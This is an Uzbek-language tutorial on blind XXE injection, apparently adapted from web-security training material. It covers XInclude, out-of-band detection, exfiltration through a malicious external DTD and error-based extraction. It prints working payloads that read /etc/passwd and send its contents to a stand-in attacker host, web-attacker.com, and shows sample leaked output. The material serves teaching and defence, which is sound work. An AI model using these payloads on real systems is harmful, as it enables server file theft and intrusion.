

Ko‘zdan yashiringan (blind) XXE zaifliklari
Ko‘plab XXE zaifliklari “ko‘zdan yashiringan” bo‘ladi. Bu — ilova tashqaridan ta’riflangan entitetlarning qiymatlarini javoblarida qaytarmaydi, shuning uchun serverdagi fayllarni to‘g‘ridan-to‘g‘ri o‘qib olish mumkin emasligini anglatadi.

Ko‘zdan yashiringan XXE zaifliklarini ham aniqlash va ekspluatatsiya qilish mumkin, lekin buning uchun yanada murakkab usullar kerak bo‘ladi. Ba’zida siz out-of-band texnikalaridan (masofaviy kanal orqali) foydalanib zaifliklarni topishingiz va ma’lumotlarni chiqarib olishingiz mumkin. Yana ba’zida XML parse qilinishida xatoliklarni qo‘zg‘atish mumkin, va shu xatolik xabarlari orqali maxfiy ma’lumotlarni oshkor qilish mumkin.

Batafsil o‘qish
Ko‘zdan yashiringan XXE zaifliklarini topish va ekspluatatsiya qilish

XXE injeksiyasi uchun yashirin hujum sathi topish
XXE injeksiyasi hujum sathi ko‘p hollarda oson aniqlanadi, chunki ilovaning oddiy HTTP trafikida XML formatidagi ma’lumotlarni o‘z ichiga olgan so‘rovlar mavjud bo‘ladi. Boshqa hollarda esa hujum sathi kamroq ko‘rinadi. Ammo, to‘g‘ri joylarni tekshirsangiz, XML bo‘lmagan so‘rovlarda ham XXE hujum sathi topishingiz mumkin.

XInclude hujumlari
Ba’zi ilovalar mijoz yuborgan ma’lumotni oladi, uni server tomonida XML hujjatiga joylaydi va so‘ng hujjatni parse qiladi. Misol uchun, mijoz yuborgan ma’lumot backenddagi SOAP so‘roviga joylashtirilsa va u xuddi shu tarzda qayta ishlansa — bunday vaziyatda klassik XXE hujumini amalga oshirish mushkul bo‘ladi, chunki siz butun XML hujjatni boshqara olmaysiz va DOCTYPE elementini qo‘shib yoki o‘zgartira olmaysiz. Biroq, XInclude yordamida hujum qilish imkoniyati bo‘lishi mumkin. XInclude — XML spetsifikatsiyasining bir qismi bo‘lib, u XML hujjatini kichik hujjatlardan birlashtirishga imkon beradi. Siz XInclude hujumini XML hujjatidagi istalgan ma’lumot maydoniga joylashtirishingiz mumkin, shuning uchun hujum siz faqatgina server tomonidagi XML hujjatiga joylashtiriladigan yagona ma’lumot elementini boshqarishingiz mumkin bo‘lgan vaziyatlarda ham amalga oshiriladi.

XInclude hujumini bajarish uchun siz XInclude namespace’ini ulashingiz va o‘qishni xohlagan fayl yo‘lini ko‘rsatishingiz kerak. Masalan:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

_________________________________________________________________________________________________________________________
Ko‘zdan yashiringan (blind) XXE ni out-of-band (OAST) texnikalari yordamida aniqlash
Ko‘pincha ko‘zdan yashiringan XXE ni aniqlash uchun XXE → SSRF hujumlarida ishlatiladigan usuldan foydalanish mumkin — ya’ni tarmoq orqali chetga (out-of-band) o‘z nazoratingiz ostidagi tizimga so‘rov yuborilishini qo‘zg‘ashingiz kerak. Masalan, tashqi entitetni quyidagicha e’lon qilishingiz mumkin:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

So‘ngra aniqlangan entitetni XML ichidagi ma’lumot qiymatida ishlatasiz.

Bu XXE hujumi serverni ko‘rsatilgan URL ga orqa tomondan HTTP so‘rov yuborishga majbur qiladi. Hujumchi DNS so‘rovi va HTTP so‘rovlarni kuzatib, shunday qilib XXE hujumi muvaffaqiyatli bo‘lganligini aniqlaydi.

Ba’zida oddiy entitetlar yordamida bajariladigan XXE hujumlari ilovaning kirish ma’lumotlarini tekshirish yoki ishlatilayotgan XML parserining qattiq sozlamalari tufayli bloklanishi mumkin. Bunday vaziyatda XML parametr entitetlaridan foydalanish mumkin. XML parametr entitetlari — DTD ichida faqat boshqa joylarda chaqirilishi mumkin bo‘lgan maxsus turdagi XML entitetlaridir. Hozircha sizga ikkita muhim jihatni bilish kifoya: birinchidan, XML parametr entitetini e’lon qilishda entitet nomidan avval foiz (%) belgisi ishlatiladi:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

Ikkinchidan, parametr entitetlari odatdagi ampersand (&) o‘rniga foiz (%) belgisi bilan chaqiriladi:

```
%myparameterentity;
```

Demak, ko‘zdan yashiringan XXE ni XML parametr entitetlari orqali out-of-band usulda sinash mumkin, masalan:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

Ushbu XXE payload `xxe` nomli XML parametr entitetini e’lon qiladi va so‘ngra uni DTD ichida chaqiradi. Bu hujumchi domeniga DNS so‘rovi va HTTP so‘rov yuborilishiga olib keladi va shu tarzda hujumning muvaffaqiyati tasdiqlanadi.




Ko‘zdan yashiringan (blind) XXE orqali ma’lumotlarni out-of-band (chetkanal) yo‘li bilan o‘g‘irlash
Out-of-band usullari orqali ko‘zdan yashiringan XXE zaifligini aniqlash yaxshi, lekin bu zaiflikning qanday ekspluatatsiya qilinishi mumkinligini ko‘rsatmaydi. Hujumchi aslida maqsad qilgan narsa — maxfiy ma’lumotlarni o‘g‘irlashdir. Bu ko‘zdan yashiringan XXE orqali amalga oshirilishi mumkin, ammo buning uchun hujumchi o‘z nazorati ostidagi tizimga zararli DTD joylab, so‘ng in-band XXE payload ichidan tashqi DTDni chaqirishi kerak bo‘ladi.

Masalan, /etc/passwd faylining mazmunini o‘g‘irlash uchun zararli DTD quyidagicha bo‘lishi mumkin:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Ushbu DTD quyidagi qadamlarni bajaradi:

1. `file` nomli XML parametr entitetini e’lon qiladi, uning qiymati `/etc/passwd` faylining mazmunidan iborat bo‘ladi.
2. `eval` nomli XML parametr entitetini e’lon qiladi; uning qiymati boshqa bir XML parametr entiteti — `exfiltrate` — ning dinamik e’lonidan iborat. `exfiltrate` entiteti hujumchi veb-serveriga HTTP so‘rov yuborilganda `file` entitetining qiymatini URL query satrida uzatadi.
3. `eval` entiteti ishlatiladi — bu `exfiltrate` entitetining dinamik e’lon qilinishini keltirib chiqaradi.
4. `exfiltrate` entiteti ishlatiladi — natijada belgilangan URL chaqiriladi va fayl mazmuni hujumchi serveriga uzatiladi.

Hujumchi zararli DTDni o‘z nazorati ostidagi tizimga (odatda o‘zining veb-serveriga) joylashi kerak. Masalan, hujumchi zararli DTDni quyidagi URLda xizmatga qo‘yishi mumkin:

```
http://web-attacker.com/malicious.dtd
```

Oxirida hujumchi zaif ilovaga quyidagi XXE payloadni yuborishi lozim:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe; ]>
```

Ushbu XXE payload `xxe` nomli XML parametr entitetini e’lon qiladi va DTD ichida uni chaqiradi. Bu XML parserni hujumchi serveridan tashqi DTDni yuklashga majbur qiladi va uni joyida (inline) talqin qiladi. Zararli DTD ichida belgilangan qadamlar bajariladi va `/etc/passwd` fayli hujumchi serveriga uzatiladi.

Eslatma
Ba’zi hollarda bu usul har doim ishlamasligi mumkin — masalan `/etc/passwd` faylidagi newline (qator yakunlash) belgilarini o‘z ichiga olgan ba’zi fayl mazmunlarini uzatib bo‘lmasligi mumkin. Buning sababi ba’zi XML parserlar tashqi entitetdagi URLni chaqirish uchun ishlatadigan API URLda qaysi belgilar ruxsat etilganini tekshiradi. Bunday holatda HTTP o‘rniga FTP protokolidan foydalanish mumkin bo‘ladi. Ba’zan esa newline belgilarini o‘z ichiga olgan ma’lumotni umuman eksfiltraytsiya qilib bo‘lmaydi; shuning uchun `/etc/hostname` kabi qator bo‘lmagan fayl maqsad qilib olinishi mumkin.


Ko‘zdan yashiringan (blind) XXE orqali xatolik xabarlari orqali ma’lumotlarni olish
Ko‘zdan yashiringan XXE ni ekspluatatsiya qilishning muqobil usuli — XML tahlilida (parsing) xato yuzaga keltirib, xato xabarida siz olib kelmoqchi bo‘lgan maxfiy ma’lumot saqlanib qolishini ta’minlashdir. Bu usul ilova xato xabarini javobda qaytarib berganda samarali bo‘ladi.

Quyidagi zararli tashqi DTD yordamida `/etc/passwd` faylining mazmunini o‘z ichiga olgan XML parsing xatosini qo‘zg‘atish mumkin:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Ushbu DTD quyidagi qadamlarni bajaradi:

1. `file` nomli XML parametr entitetini e’lon qiladi; uning qiymati `/etc/passwd` faylining mazmuni bo‘ladi.
2. `eval` nomli XML parametr entitetini e’lon qiladi; uning qiymati `error` deb nomlangan boshqa bir XML parametr entitetining dinamik e’lonidan iborat. `error` entiteti esa mavjud bo‘lmagan faylni yuklashga urinish orqali baholanadi — bu fayl nomi `file` entiteti qiymatini o‘z ichiga oladi.
3. `eval` entiteti ishlatiladi — bu `error` entitetining dinamik e’lon qilinishiga olib keladi.
4. `error` entiteti ishlatiladi — natijada mavjud bo‘lmagan faylni yuklashga urinish yuz beradi va xato xabarida mavjud bo‘lmagan fayl nomi (ya’ni `/etc/passwd` mazmuni) paydo bo‘ladi.

Zararli tashqi DTD chaqirilganda quyidagiga o‘xshash xato xabar hosil bo‘lishi mumkin:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

